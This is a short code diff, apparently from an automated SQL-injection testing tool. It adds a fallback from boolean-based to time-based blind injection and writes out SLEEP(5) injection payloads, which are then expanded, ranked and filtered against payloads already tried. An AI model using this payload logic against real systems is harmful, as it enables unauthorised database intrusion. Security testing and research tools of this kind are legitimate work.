@@ -481,6 +481,24 @@ def _choose_heuristic_decision(observation: Dict[str, Any], reason: str) -> Dict
                 if isinstance(a, dict) and a.get("payload")
             },
         )
+        if not ranked_candidates and strategy == "SWITCH_BOOLEAN" and "SWITCH_TIME" in allowed:
+            strategy = "SWITCH_TIME"
+            next_payload = "1' AND SLEEP(5) -- -" if has_quote else "1 AND SLEEP(5)"
+            base_candidates = expand_candidates(next_payload, strategy, current)
+            ranked_candidates, best_reason = _heuristic_ranked_candidates(
+                current_payload=current,
+                likely_intent=likely_intent,
+                likely_damage=likely_damage,
+                strategy=strategy,
+                base_candidates=base_candidates,
+                memory_case=best_memory,
+                attempted_payloads={
+                    str(a.get("payload") or "").strip()
+                    for a in attempts
+                    if isinstance(a, dict) and a.get("payload")
+                },
+            )
+
         chosen = ranked_candidates[0]["payload"] if ranked_candidates else next_payload
 
         return {
